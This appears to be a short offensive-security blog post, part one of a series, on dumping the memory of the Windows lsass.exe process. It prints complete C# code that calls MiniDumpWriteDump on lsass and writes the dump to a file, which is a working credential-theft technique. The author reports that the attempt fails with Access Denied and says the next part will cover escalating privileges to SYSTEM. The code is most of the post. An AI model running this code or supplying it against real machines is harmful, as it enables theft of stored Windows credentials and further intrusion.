## Dumping lsass.exe memory - Part 1 

This is going to be **failed** story where I thought that it is very simple to dump lsass.exe memory. Upon trying to run the code it kept on showing `Access Denied` which meant that even though I am Administrator I can't still access SYSTEM level process. This means that I need to look for ways to elevate myself from Administrator to SYSTEM to try dumping it again. But again this is just seems to be a resonable explaination for the error.

Code:
```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections;


class Program
{
    [DllImport("dbghelp")]
    private static extern bool MiniDumpWriteDump(IntPtr hProcess, UInt32 ProcessId, SafeHandle hFile, UInt32 dumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);


    static void Main(string[] args)
    {
        Process[] process = Process.GetProcessesByName("lsass");
        FileStream fs = new FileStream("lsass.dat", FileMode.Create);

	//MiniDumpWriteDump is used to dump memory of process and returns bool according to success status.
        bool status = MiniDumpWriteDump(process[0].Handle, (UInt32)process[0].Id, fs.SafeFileHandle, (UInt32)2, IntPtr.Zero, IntPtr.Zero,IntPtr.Zero);
        if (status)
        {
            System.Console.WriteLine("Done!");
            fs.Close();
            System.Console.ReadLine();
        }
        else
        {
	    fs.Close();
            System.Console.WriteLine("[!] Error dumping the process");
        }
    }
}
```

## Result?
- This showed `Access Denied` ruining my short win xD.
- Time to look into more detailed approach by evelation privs which should be for next part
